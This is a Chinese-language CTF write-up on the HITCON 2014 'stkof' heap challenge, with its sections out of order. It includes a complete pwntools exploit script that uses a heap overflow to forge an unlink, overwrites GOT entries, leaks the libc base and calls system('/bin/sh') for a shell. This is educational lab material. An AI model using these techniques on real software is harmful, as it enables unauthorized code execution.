
```python
# overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got
payload = 'a' \* 8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi'])
fill(2, len(payload), payload)
# edit free@got to puts@plt
payload = p64(elf.plt['puts'])
fill(0, len(payload), payload)
```

![image-20201124140110853](upload/attach/202011/830671\_KSWH8S3WBSM85D8.jpg)

e. 泄漏`puts`函数真实地址，然后计算`libc`、`system`函数地址。`free(global[1]) == puts(puts@got)`

```python
#free global[1] to leak puts addr
delete(1)
puts\_addr = ru('\nOK\n')
puts\_addr = uu64(puts\_addr)
leak('puts addr: ' ,puts\_addr)
libc\_base = puts\_addr - libc.symbols['puts']
binsh\_addr = libc\_base + next(libc.search('/bin/sh'))
system\_addr = libc\_base + libc.symbols['system']
leak('libc base: ' , libc\_base)
leak('/bin/sh addr: ', binsh\_addr)
leak('system addr: ',system\_addr)
dbg()
```

![image-20201124141416019](upload/attach/202011/830671\_4THU8CVAV22US5N.jpg)

f. 利用`fill`函数修改`atoi@got`为`system`地址

```python
payload = p64(system\_addr)
fill(2, len(payload), payload)
p.send(p64(binsh\_addr))
```

关掉调试信息，结果如下图所示，需要从第2次输入shell命令才能正确回显结果。

![image-20201124141704859](upload/attach/202011/830671\_XVK4A8N7TV46S22.jpg)

### 步骤五：构造Exp

```python
from pwn import \*
from LibcSearcher import LibcSearcher
from sys import argv
def ret2libc(leak, func, path=''):
if path == '':
libc = LibcSearcher(func, leak)
base = leak - libc.dump(func)
system = base + libc.dump('system')
binsh = base + libc.dump('str\_bin\_sh')
else:
libc = ELF(path)
base = leak - libc.sym[func]
system = base + libc.sym['system']
binsh = base + libc.search('/bin/sh').next()
return (system, binsh)
s = lambda data :p.send(str(data))
sa = lambda delim,data :p.sendafter(delim, str(data))
sl = lambda data :p.sendline(str(data))
sla = lambda delim,data :p.sendlineafter(delim, str(data))
r = lambda num=4096 :p.recv(num)
ru = lambda delims, drop=True :p.recvuntil(delims, drop)
uu64 = lambda data :u64(data.ljust(8,'\0'))
leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
#context.log\_level = 'DEBUG'
binary = './stkof'
context.binary = binary
elf = ELF(binary,checksec=False)
p = remote('127.0.0.1',0000) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86\_64-linux-gnu/libc.so.6',checksec=False)
#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1\_amd64/libc-2.27.so',checksec=False)
libc = ELF('./libc.so.6',checksec=False)
def dbg():
gdb.attach(p)
# pause()
def create(size):
sl(1)
sl(size)
ru('OK\n')
def delete(index):
sl(3)
sl(index)
def fill(index, size, content):
sl(2)
sl(index)
sl(size)
s(content)
ru('OK\n')
def show(index): # useless
sl(4)
sl(index)
#start
# trigger to malloc buffer for io function
create(0x100) # idx 1
create(0x30) # idx 2
# small chunk size in order to trigger unlink
create(0x80) # idx 3
#dbg()
# a fake chunk at global[2] = global0 + 16 who's size is 0x20
global0 = 0x602140
payload = p64(0) #prev\_size
payload += p64(0x30) #size --> except the first line, the rest two line is equal to 0x20?
payload += p64(global0 + 16 - 0x18) #fd
payload += p64(global0 + 16 - 0x10) #bk
#payload += p64(0x20) # next chunk's prev\_size bypass the check
payload = payload.ljust(0x30, 'a')
# overwrite global[3]'s chunk's prev\_size
# make it believe that prev chunk is at global[2]
payload += p64(0x30) #0x30 is the front one whole size?
# make it believe that prev chunk is free
payload += p64(0x90)
fill(2, len(payload), payload)
#dbg()
# unlink fake chunk, so global[2] =&(global[2]) - 0x18 = global0 - 8
delete(3)
p.recvuntil('OK\n')
#dbg()
# overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got
payload = 'a' \* 8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi'])
fill(2, len(payload), payload)
# edit free@got to puts@plt
payload = p64(elf.plt['puts'])
fill(0, len(payload), payload)
#dbg()
#free global[1] to leak puts addr
delete(1)
puts\_addr = ru('\nOK\n')
puts\_addr = uu64(puts\_addr)
leak('puts addr: ' ,puts\_addr)
libc\_base = puts\_addr - libc.symbols['puts']
binsh\_addr = libc\_base + next(libc.search('/bin/sh'))
system\_addr = libc\_base + libc.symbols['system']
leak('libc base: ' , libc\_base)
leak('/bin/sh addr: ', binsh\_addr)
leak('system addr: ',system\_addr)
#dbg()
# modify atoi@got to system addr
payload = p64(system\_addr)
fill(2, len(payload), payload)
p.send(p64(binsh\_addr))
# end
p.interactive()
```

## 参考文献

- <a href="elink@9b5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6Y4L8r3W2T1j5#2)9J5k6r3S2W2j5i4m8Q4x3V1k6#2L8X3I4A6L8X3E0Q4x3X3c8\*7K9q4)9J5c8R3`.`.">ctfwiki-unlink</a>

- <a href="elink@1d6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2K6k6h3y4H3N6h3I4K6k6g2)9J5k6h3y4G2L8g2)9J5c8X3q4J5j5$3S2A6N6X3g2K6i4K6u0r3x3e0p5#2x3K6R3^5i4K6u0W2K9s2c8E0L8l9`.`.">HITCON 2014 stkof Writeup(Unlink)</a>

- <a href="elink@dcaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0r3j5%4c8X3i4K6u0V1j5$3S2S2L8r3I4W2L8X3N6W2M7#2)9J5c8Y4c8J5k6h3g2Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6H3N6$3&6Q4x3V1k6Z5k6h3q4H3i4K6u0r3N6h3&6D9K9h3&6C8i4K6u0r3x3U0l9I4y4q4)9#2k6X3S2A6N6r3y4G2L8W2)9#2k6Y4y4@1K9$3!0X3">stkof题目github地址</a>

## 2014_hitcon_stkof

### 步骤一：运行查看

- 没有菜单，还是反编译分析吧。

![image-20201123102330429](https://bbs.kanxue.com/upload/attach/202011/830671_WSRXZZ6JHDKBMMQ.jpg)

### 步骤二：查看文件类型和保护机制

- 64位程序
- 开启了Canary和NX，RELRO为Partial RELRO，关闭了PIE。

```
|  |  |
| --- | --- |
| 1  2  3  4  5 | `lzx@ubuntu16x64:``2014_hitcon_stkof``$` `file` `stkof`  `stkof: ELF` `64``-``bit LSB executable, x86``-``64``, version` `1` `(SYSV), dynamically linked, interpreter` `/``lib64``/``23_11``-``linux.so.``2``,` `for` `GNU``/``Linux` `2.6``.``32``, BuildID[sha1]``=``4872b087443d1e52ce720d0a4007b1920f18e7b0``, stripped`  `lzx@ubuntu16x64:``2014_hitcon_stkof``$ checksec` `-``-``file``=``stkof`  `RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols        FORTIFY    Fortified    Fortifiable` `FILE`  `Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No` `0`        `3`        `stkof` |
```

### 步骤三：IDA反编译分析

- `main`函数

![image-20201123103008281](https://bbs.kanxue.com/upload/attach/202011/830671_EN3A2VREVDWG29W.jpg)

- `create`函数：由于在把`malloc`返回指针放入数组前，会将`index`先自增1，所以，第1个chunk的`index`为1。

![image-20201123103043095](https://bbs.kanxue.com/upload/attach/202011/830671_A9BEMJJ48C78C9E.jpg)

验证第1个chunk的`index`为1

![image-20201123111813609](https://bbs.kanxue.com/upload/attach/202011/830671_P4WKB58RXF2584S.jpg)

- `fill`函数

![image-20201123104813479](https://bbs.kanxue.com/upload/attach/202011/830671_QTAXVUNSJZEJJB6.jpg)

- `delete`函数

![image-20201123104851094](https://bbs.kanxue.com/upload/attach/202011/830671_7HZF8X3D87B4FFN.jpg)

- `show`函数

![image-20201123104910209](https://bbs.kanxue.com/upload/attach/202011/830671_RXYVGHBUYPAEYHH.jpg)

- 全局数组`globals`地址为：`0x602140`。

![image-20201124094445306](https://bbs.kanxue.com/upload/attach/202011/830671_R7H46MXWTY6DNJN.jpg)

**思路**：

- RELRO为Partial RELRO，那么可以改写`got`表；
- 没有`system`等后门函数，所以得想办法先泄漏`libc`，然后调用`libc`里的`system`函数；
- 要泄漏？那么我们看看打印和输入的地方有哪些：
  - 打印：`show`函数没有打印堆里的内容，没法leak，所以我们得想办法leak。
  - 输入：有一个`fill`函数，可以往`bss`段里`globals`数组中那些指针所指向的地方写。
- 而`fill`函数中存在堆溢出，可以利用`unlink`漏洞修改`globals`数组！程序里有`puts`函数，所以我们可以把`puts`函数`plt`地址放到另一个函数的`got`表项里，这样，调用这个函数的时候就会去调用`puts`函数。至于这个函数选哪个，因为`puts`函数参数是char型指针，所以我们可以选取程序里有的，且参数同样为指针的`free`/`atoi`函数。但是如果用`atoi`函数，那么我们后面就没法用`free`函数了，因为输入“菜单选项”后就会调用`atoi`函数，没法继续下去。所以，我们选`free`函数。
- 下面两图是把`puts@plt`放入`free`函数的`got`表项里。那么这时候调用`free(globals[2])`的话，就等价于`puts(puts@got)`，会调用`puts`函数把`puts@got`的内容打印出来。
- 得到`puts`函数真实地址后，就可以计算`libc`基址及`system`函数地址了，最后把`system`地址通过`fill`函数写入`atoi@got`，把“`/bin/sh`”当作“菜单选项”输入，就会调用`atoi`函数，也就是调用`system("/bin/sh")`以getshell！

![image-20201124093256371](https://bbs.kanxue.com/upload/attach/202011/830671_242FJNEZPHWDCEJ.jpg)

> 通过`unlink`漏洞把这三个函数`got`表项地址写入`globals`数组中。
